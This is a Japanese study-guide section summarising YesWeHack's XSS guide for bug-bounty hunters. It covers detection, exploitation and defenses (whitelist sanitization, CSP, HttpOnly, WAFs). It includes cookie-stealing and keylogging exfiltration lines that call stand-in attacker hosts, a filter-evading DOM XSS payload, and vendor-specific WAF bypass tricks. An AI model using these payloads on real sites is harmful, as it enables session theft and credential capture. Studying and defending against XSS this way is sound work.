## YesWeHack XSS徹底ガイド

このセクションでは、フランスのバグバウンティプラットフォーム **YesWeHack** が公開している実務者向け記事「*Cross-Site Scripting (XSS) Attacks & Exploitation: The Ultimate Guide*」を精読する。PortSwiggerの学習教材やOWASPのチートシートが「原理と分類」に軸足を置くのに対し、この記事は**バグバウンティハンター（脆弱性を発見して報告する側の実務者）が実際に手を動かすときの思考順序**――「どこで見つかるか」「どう検出するか」「見つけた後、影響をどう最大化するか」――に沿って書かれている点が特徴である。特に、**単なる `alert(1)` のポップアップで終わらせず、実際に被害者を害する具体的な悪用シナリオまで踏み込む**という姿勢は、報告書の説得力（＝深刻度評価やバウンティ額に直結する）を左右する実務的な視点として重要である。

### XSSとは何か、なぜ「中程度」評価では実態を見誤るのか

記事はまずXSSを次のように定義する。

> "Cross-Site Scripting (XSS), classed as CWE-79, refers to a class of security vulnerabilities in web applications where an attacker injects malicious JavaScript code into content that is delivered to users."
>（XSS、CWE-79に分類される脆弱性は、攻撃者が悪意あるJavaScriptコードをユーザーに配信されるコンテンツに注入する、Webアプリケーションのセキュリティ脆弱性の一群を指す。）

CWE（Common Weakness Enumeration）は「脆弱性の型」を分類する共通識別子の体系で、79番がXSSに割り当てられている。本質的な原因は一貫している――**アプリケーションがユーザー入力を、それが出力されるコンテキスト（HTML本文・属性・JavaScript文字列・URLなど）に応じて適切に検証・エスケープしていないこと**である。この「コンテキストに応じた」という点が実務上の落とし穴で、後述のDOM XSSの例のように、開発者が「エスケープしたつもり」でも出力先の文法（HTML属性としての解釈規則）を誤解していれば注入は成立してしまう。

CVSS（Common Vulnerability Scoring System、脆弱性の深刻度を数値化する業界標準）ベースの自動診断ツールやチェックリストは、XSSを機械的に「中程度（Medium）」に格付けしがちである。だが記事はこの評価を実務上の誤りだと指摘する。実際の到達点は次のように広い。

- **アカウント乗っ取り（Account Takeover, ATO）** ―― セッショントークンやCSRFトークンの窃取を通じて、被害者本人になりすます。
- **他ユーザーの機密データの改ざん** ―― 被害者の権限でAPIを呼び出し、設定やデータを書き換える。
- **稀なケースでの任意ファイル読み取りやリモートコード実行（RCE）** ―― 管理画面やElectronベースのデスクトップアプリなど、JavaScript実行がOS操作に直結する環境では、XSSがサーバーサイド／クライアントサイドの完全な侵害にまで発展しうる。

つまり「XSS＝中程度」という機械的な評価は、**攻撃者が最小努力（`alert(1)` の表示）で満足した場合の下限**にすぎず、悪用のシナリオ設計次第で深刻度は大きく跳ね上がる、というのがこの記事全体を貫くメッセージである。

### XSSの4つの主要タイプと、それぞれの「見つけ方・悪用の仕方」

記事はXSSを4分類し、それぞれについて **検出方法（Detection）** と **悪用メカニズム（Exploitation）** をセットで解説する。この「検出と悪用を分けて書く」構成自体が、バグバウンティの実務フロー（まず見つける→次に深刻度を上げる材料を作る）を反映している。

#### 1. リフレクテッド（Reflected）XSS

**検出方法**: 検索フォーム、ログインフォームのエラーメッセージ、URLパスパラメータなど、**ユーザーが入力しサーバーがその値をレスポンスにそのまま含めて返す箇所**で見つかる。「反射（reflect）」という名前の通り、入力が保存されずにその場のレスポンスに跳ね返ってくる点が特徴で、攻撃を成立させるには被害者に悪意あるリンクをクリックさせる必要がある（フィッシングとの組み合わせが前提になる）。

**基本ペイロード例**（セッションクッキーの窃取）:

```javascript
fetch(`//ATTACKER_SERVER/?data=${btoa(document.cookie)}`)
```

このコードが動く理由を分解する。`document.cookie` は、`HttpOnly` フラグ（後述）が付いていないクッキーをJavaScriptから読み取れるブラウザAPIである。`btoa()` はBase64エンコード関数で、クッキーの値に含まれうる `;` や空白、非ASCII文字を、URLのクエリパラメータとして安全に運べる形式に変換する。`fetch()` はプロトコル相対URL（`//` で始まり、現在のページと同じスキーム＝httpかhttpsを継承する）で攻撃者のサーバーにGETリクエストを送る。この一行だけで、被害者のブラウザに「自分のクッキーを外部に送信させる」ことができる。ここで注意すべきは、単純な `fetch()` はクロスオリジンでもリクエスト自体は送信される（CORSはレスポンスの**読み取り**を制限するのであって、送信自体は防がない）という点で、データを盗む側の攻撃者はレスポンスを読む必要がない（クエリパラメータとしてサーバーログに残ればよい）ため、CORSはこの攻撃の障害にならない。

**認証を要するリフレクテッドXSSの実例（複合攻撃のシナリオ）**

記事はより高度な悪用例として、次のようなエンドポイントを挙げている。

```
https://example.com/dashboard/UUID/search?query=XSS_PAYLOAD
```

このエンドポイントは**ログイン後**にしかアクセスできないダッシュボード内の検索機能で、`query` パラメータにXSSペイロードを注入できる。単体では「ログイン済みの被害者が、このURLを踏まないと発火しない」という制約があり悪用シナリオが弱く見える。しかし記事は、これを**別の脆弱性と連鎖させる**ことで実用的な攻撃に変える方法を示す。

前提として次の2つが必要になる。

1. **ログイン処理に対するCSRF（Cross-Site Request Forgery）脆弱性** ―― 攻撃者があらかじめ用意した認証情報（攻撃者自身のアカウント）で、被害者のブラウザに強制的にログインさせられること。CSRFトークンが存在しない、あるいは検証されていないログインフォームがあれば、攻撃者は被害者のブラウザ上で「攻撃者のアカウントとしてログインする」POSTリクエストを、被害者に気づかれずに送信させられる。
2. **ローカルエンドポイント（同一オリジン内のパス）へのリダイレクトを許可する機能** ―― ログイン成功後に、`?redirect=` のようなパラメータで遷移先を指定できる仕組み。

これらを組み合わせると、攻撃者は次のリンクを被害者に踏ませるだけで攻撃を完結できる。

1. 被害者がリンクをクリックすると、CSRFにより**攻撃者のアカウントで自動的にログイン**させられる。
2. ログイン完了後、`redirect` パラメータによって**攻撃者が用意したXSSペイロード付きの検索URL**（前述の `search?query=XSS_PAYLOAD`）へ自動遷移する。
3. XSSペイロードが（攻撃者のアカウントのセッション内で）実行される。

ここで疑問が浮かぶ――「攻撃者は自分のアカウントに攻撃者自身がログインしているだけでは？」という点だが、記事の狙いはその先にある。**XSSペイロード自体が、ページ上に偽のログインフォームをiframeやインラインHTMLとして描画し、被害者に「セッションが切れたので再ログインしてください」と信じ込ませて本物の認証情報を入力させる**、というフィッシングの土台としてXSSを使う。被害者は「見慣れたドメイン（example.com）上の、見慣れたUIのログインフォーム」に入力するため、疑うきっかけがほとんどない。これは**同一オリジン上で発生するフィッシングは、ブラウザのアドレスバー確認という一般的な防御策をすり抜ける**という、XSSとソーシャルエンジニアリングの組み合わせが持つ本質的な危険性を示す好例である。

#### 2. ストアド（Stored）XSS

**検出方法**: コメント欄、掲示板の投稿、チャットメッセージ、プロフィール欄など、**ユーザー入力がデータベースやファイルに永続的に保存され、後から（多くの場合、他のユーザーに対して）表示される箇所**で見つかる。

**危険性**: リフレクテッドXSSと違い、被害者に特別なリンクをクリックさせる必要がない。**該当ページを閲覧しただけの、無関係な第三者すべてが自動的に被害を受ける**ため、影響範囲がリフレクテッドより桁違いに広がりやすく、通常は高～クリティカルの深刻度に格付けされる。

**悪用戦略（「マルウェア型」アプローチ）**: 記事は、ストアドXSSを見つけたあとの悪用方針として、単発のペイロードではなく**持続的に動作する小さなマルウェアをJavaScriptで書く**アプローチを推奨する。手順は概ね次の通りである。

1. **リスナーを設置する** ―― `document.addEventListener` などでユーザーの操作（キー入力、クリック、フォーム送信）を継続的に監視するコードを仕込む。
2. **ページ全体を覆う不可視のiframeで被害者を「隔離」する** ―― 被害者の目には正規のページに見えるが、実際には攻撃者が制御するiframeがかぶさっており、被害者の入力を横取りできる状態を作る。
3. **キー入力、マウス位置、フォームへの応答をハイジャックする** ―― キーロガーとして機能させ、被害者が入力するパスワードや個人情報を収集する。
4. **収集したデータを画像タグ経由でサーバーへ送信する** ―― `new Image().src = "//attacker.com/log?d=" + data` のように、`<img>` タグのリクエストとしてデータを外部送信する。画像リクエストはCORSのプリフライト（事前確認）やContent-Typeの制約を受けにくく、多くのCSP設定でも見落とされがちな抜け穴になるため、**CORS制限を実質的に回避する定番の抽出（exfiltration）手法**として使われる。

この手法が有効な理由は、`<img src="...">` の読み込みが「単純リクエスト」としてブラウザに扱われ、JavaScriptからの `fetch`/`XMLHttpRequest` に課されるCORSのオリジンチェックの対象にならないためである（レスポンスをJavaScriptから読み取る必要がなく、送信できればよいので画像タグで十分機能する）。

#### 3. DOM XSS

**検出方法**: サーバーサイドのHTMLソースにはペイロードが一切現れず、**ブラウザ側のJavaScriptがDOM（Document Object Model、HTML文書をツリー構造として表現しJavaScriptから操作可能にする仕組み）を書き換える際に汚染される**ため、ネットワークタブやサーバーログを見ても気づけない。記事はブラウザの開発者ツール、および専用ツールである **DOM Invader**（Burp Suiteに内蔵されたDOM XSS検出支援機能。本教科書のセクション3で詳述）や **DOM Invaderのソース・シンク解析機能に相当するDOM Explorer**の利用を推奨している。

**脆弱なコード例**:

```javascript
document.body.innerHTML += "<a href='" + window.location.href + "'>Home</a>"
```

このコードの問題を仕組みレベルで説明する。`window.location.href` は現在のページのURL全体（攻撃者が自由に細工できる**ソース**＝汚染された入力の発生源）を返す。それを**エスケープなしで文字列連結し、`innerHTML` に代入**している。`innerHTML` への代入は、ブラウザのHTMLパーサーを**その場で再起動**させ、代入された文字列をHTMLとして構文解析させる（＝**シンク**、汚染データが危険な形で消費される地点）。したがって、URLの中に単一引用符 `'` を含む値を混入できれば、`href='...'` という属性値の文字列リテラルを**その場で終了**させ、後続の文字列を新しい属性やタグとして解釈させられる。

**悪用ペイロード**（URLのフラグメントやクエリに混入させる想定）:

```
x' oncontentvisibilityautostatechange=alert(1) style='display:block;content-visibility:auto
```

これが埋め込まれると、生成されるHTMLは次のようになる。

```html
<a href="x" oncontentvisibilityautostatechange="alert(1)" 
style="display:block;content-visibility:auto">Home</a>
```

このペイロードが機能する仕組みを段階的に見る。まず `x'` によって `href` 属性値を早期に閉じる。次に空白を挟んで新しい属性 `oncontentvisibilityautostatechange=alert(1)` を追加する――これは**CSS Content Visibilityの状態変化イベント**に紐づくイベントハンドラ属性で、比較的新しいブラウザAPI（`content-visibility` プロパティが要素の描画をスキップ可能にする仕組みに付随するイベント）であり、従来型のWAFやXSSフィルタの「危険なイベントハンドラのブラックリスト」（`onerror`, `onload`, `onclick` など定番のものだけを弾く実装）が**新しいイベントハンドラの存在を把握しておらず素通りさせてしまう**典型例になっている。最後に `style='display:block;content-visibility:auto'` で `content-visibility: auto` を指定し、要素が実際に可視化された際に状態変化イベントを発火させる引き金を作っている。記事が明記する通り、**この種のペイロードはブラウザの実装差により動作が変わりうる**（新しいCSS/HTML機能への対応状況がブラウザエンジンごとに異なるため）。この事実は、XSSフィルタやWAFのブラックリスト方式が**新しいHTML/CSS/JS機能が追加されるたびに原理的に後手に回る**という設計上の限界を示しており、ホワイトリスト方式（許可するタグ・属性のみを列挙する）や、そもそもユーザー入力をHTMLとして解釈させない設計（後述のサニタイズ）が優先されるべき理由になっている。

#### 4. ブラインド（Blind）XSS

**検出方法**: ペイロードを注入しても**攻撃者自身のブラウザでは実行結果が確認できない**――例えば「お問い合わせフォーム」に投稿した内容が、攻撃者には見えない**管理者用の承認待ちキュー画面**で表示されるようなケースである。このため検出には**OAST（Out-of-band Application Security Testing、帯域外テスト）**が用いられる。これは、ペイロードの中に攻撃者が管理する外部サーバーへのコールバック（例: `<script src="//attacker.oast.example/x.js"></script>`）を仕込んでおき、**いつ・誰の環境で・どのHTTPヘッダーとともに**そのURLへのリクエストが飛んできたかを監視することで、「ペイロードが後で誰かの画面で実行された」ことを間接的に検知する手法である（Burp CollaboratorやXSS Hunterなどのツールがこの役割を担う）。

**特徴**: 攻撃者の操作直後には何も起きず、**時間差・別コンテキストで（多くの場合、サポート担当者や管理者など高権限のユーザーの画面で）実行される**。この「発見しにくいが刺さったときの影響が大きい」性質から、記事は**スパイウェア型のマルウェア**（ストアドXSSと同様にキー入力やページ操作を監視・外部送信するコード）を仕込む戦略を提案しており、高権限ユーザーの管理画面操作を盗聴できればアカウント乗っ取りに直結する。

### XSSの防御とミティゲーション

記事は攻撃側の解説に続き、開発者・運用者側が取るべき対策も具体的なコード例つきで示している。バグバウンティハンターにとってもこれらは重要で、**どの対策が入っているか／入っていないかを見極めることが、脆弱性の悪用可能性と深刻度評価を判断する材料になる**。

#### 入力検証と出力エンコード（ホワイトリスト方式）

記事は、危険な文字を一つずつ排除する**ブラックリスト方式**ではなく、**許可する要素だけを列挙するホワイトリスト方式**を推奨する。Node.jsでの実装例として、`sanitize-html` ライブラリを用いたコードが示されている。

```javascript
const userInput = '<img src=x onerror=alert("XSS!")>';

const sanitizeHtml = require('sanitize-html');
const sanitizedOutput = sanitizeHtml(userInput, {
  allowedTags: ['b', 'i', 'img', 'strong'],
  allowedAttributes: {
    'img': ['src']
  }
});
```

この設定が安全な理由は、`allowedAttributes` で `img` タグに許可する属性を `src` のみに限定している点にある。`onerror` のようなイベントハンドラ属性はホワイトリストに含まれていないため、**入力に含まれていても構造ごと除去される**（ブラックリストのように「`onerror` という文字列だけを消す」実装だと、大文字小文字の変化や属性名の間に無意味な文字を挟む難読化で回避されうるのに対し、ホワイトリストは「許可リストにない属性はすべて落とす」ため、攻撃者が知らない新しいイベントハンドラ――前述の `oncontentvisibilityautostatechange` のような――が登場しても自動的に防げるという頑健性がある)。

#### コンテンツセキュリティポリシー（CSP）

CSP（Content Security Policy）は、HTTPレスポンスヘッダーでブラウザに対して「このページで実行してよいスクリプトの出所」などを宣言する仕組みである。Express.js（Node.jsのWebフレームワーク）でのミドルウェア実装例が示されている。

```javascript
app.use((req, res, next) => {
  res.setHeader("Content-Security-Policy", 
    "default-src 'self'; " +
    "script-src 'self'; " +
    "style-src 'self'; " +
    "img-src 'self'; " +
    "object-src 'none'; " +
    "base-uri 'self'; " +
    "frame-ancestors 'none'"
  );
  next();
});
```

各ディレクティブの意味を整理する。`script-src 'self'` は自サイト（同一オリジン）から配信されたスクリプトファイルのみ実行を許可し、インラインスクリプトや `eval()`（デフォルトでは `'unsafe-inline'`/`'unsafe-eval'` を指定しない限りブロックされる）を禁止する。これにより、攻撃者が `<script>alert(1)</script>` を注入できても**そのインラインスクリプトはブラウザによって実行が拒否される**。`object-src 'none'` は `<object>`/`<embed>` 経由でのプラグイン実行を禁止し、`base-uri 'self'` は `<base>` タグによる相対URL解決先の乗っ取り（第4章で扱うDOM Clobbering系の攻撃とも関連する）を防ぎ、`frame-ancestors 'none'` は自サイトが他サイトのiframeに埋め込まれること（クリックジャッキングの土台）を防ぐ。ただしCSPは**万能ではなく**、後の章（第4章 s4i「CSP is dead」相当のセクション）で扱うように、JSONPエンドポイントの許可や `'unsafe-inline'` の併用、あるいはプロトタイプ汚染やDOM Clobberingを用いたガジェットチェーンによって回避されうることが知られている点も念頭に置く必要がある。

#### セキュアなクッキーフラグ（HttpOnly）

記事は `HttpOnly` フラグの実装を推奨している。これはクッキーの発行時（`Set-Cookie` ヘッダー）に付与する属性で、付与されたクッキーは**JavaScriptの `document.cookie` から一切読み取れなくなる**（ブラウザのAPI仕様レベルで隠蔽される）。前述の最初のペイロード例（`fetch(...document.cookie...)`）は、対象クッキーに `HttpOnly` が付与されていれば**空文字列しか取得できず無力化される**。これはXSS自体を防ぐものではないが、**XSSが成立した場合の被害（セッション窃取）を局所化する多層防御（defense in depth）の代表例**である。

#### Webアプリケーションファイアウォール（WAF）

WAFはルールベースの検出、既知の攻撃パターンとの照合（シグネチャマッチング）、リクエストパターンの統計的分析、機械学習モデルによる異常検知などを組み合わせてXSSを含む攻撃をブロックする境界防御である。ただし、記事および補強資料として参照した同じくYesWeHackの「WAF Bypass」記事が指摘するように、**WAFは正規表現ベースの検出を採用していることが多く、原理的にバイパス可能**である。例えば `<.*on.*=.*>` のような単純な正規表現は、`.` が改行文字にマッチしないため `<img src=1%0aonerror=alert(1)>`（`%0a` は改行のURLエンコード）のように**ペイロードの途中に改行を挟むだけで検出をすり抜ける**。ベンダー別の弱点として、CloudFlareは改行や括弧の多重化（`(sleep((3)))`）・Base64エンコードに、Akamaiは二重URLエンコード（`%2522`）・複数行コメント・括弧前の空白挿入に、Airlockは引用符で囲んだペイロード（`"alert(1)"`）にそれぞれ弱いことが報告されている。ここで重要な注意点として、記事は**「WAFのバイパス」と「脆弱性そのものの悪用可能性」を混同してはならない**と釘を刺している――WAFを通過させることに成功しても、バックエンドのサニタイズが別途機能していれば攻撃は成立しない。バグバウンティの実務では、単純なペイロード（`<script>`など）から始めて対象システムの反応を観察し、得られた情報を元に段階的にペイロードを調整していく反復的なアプローチが推奨されている。

> 出典: WAF Bypass Guide — https://www.yeswehack.com/learn-bug-bounty/web-application-firewall-bypass

### 参考: xsstools ―― ペイロード開発を支援するフレームワーク

補強資料として、YesWeHackが公開しているGitHubリポジトリ **xsstools** も参照した。これは「ペイロードの記述を簡単にすることを目的としたXSS開発フレームワーク」であり、GPL-3.0ライセンスでバグバウンティ・ペネトレーションテスト・セキュリティ研究向けに公開されている。構成は次の4つのコンポーネントからなる。

- **Exfiltrators（データ抽出モジュール）** ―― `postMessage`、`fetch`（GET/POST）、`navigator.sendBeacon`、コンソール出力、`<img>` タグ、`<style>` タグ、iframeなど、**本文中で解説した「画像タグ経由の抽出」を含む複数の抽出経路**を選択的に利用できるようにする。
- **Payload生成ツール** ―― キーロガーの起動、API呼び出し、データの評価・抽出などの処理を**連鎖（チェーン）させて**一つのペイロードとして組み立てる機能。
- **Wrapper（難読化）** ―― Base64エンコード、テンプレートリテラル、画像読み込み、iframeなどを用いてペイロード自体を隠蔽する機能。前述のWAF回避（Base64エンコードなど）とも関連する。
- **ClickJacker** ―― クリックジャッキング攻撃（透明化したiframeを重ねて意図しないクリックを誘発する攻撃）を座標指定で自動化するモジュール。

このツールの存在自体が、本セクションで解説した「マルウェア型」の悪用戦略（リスナー設置・iframeによる隔離・データ抽出）が**バグバウンティの実務で定型化された作業パターン**であることを裏付けている。

> 出典: xsstools — https://github.com/yeswehack/xsstools

### まとめ ―― 「`alert(1)` の先」を書けるかどうか

記事は最後を次の一文で締めくくっている。

> "Now you know that there's more to XSS than putting 'alert(1)' in your cross-site scripting payloads, and that this ubiquitous security flaw can do a lot of damage – with the right payload and process."
>（XSSのペイロードに `alert(1)` を入れるだけがXSSではないこと、そして適切なペイロードとプロセスがあれば、この遍在する脆弱性が大きな被害をもたらしうることが分かっただろう。）

バグバウンティの実務においては、脆弱性の**存在証明（Proof of Concept）**として `alert(document.domain)` を示すだけで十分なケースも多いが、深刻度評価やバウンティ額の交渉においては、**「その脆弱性が実際に何を可能にするか」を具体的なシナリオとコードで示せるかどうか**が決定的な差を生む。本セクションで見た4分類（リフレクテッド／ストアド／DOM／ブラインド）はそれぞれ検出の勘所と悪用の型が異なり、CSRFとの連鎖、iframeによる被害者の隔離、画像タグを使ったCORS制限の実質的な回避といった具体的技法は、後続の章（特に第4〜5章で扱うCSP回避やプロトタイプ汚染、DOM Clobbering）でも繰り返し姿を変えて登場する基礎になっている。
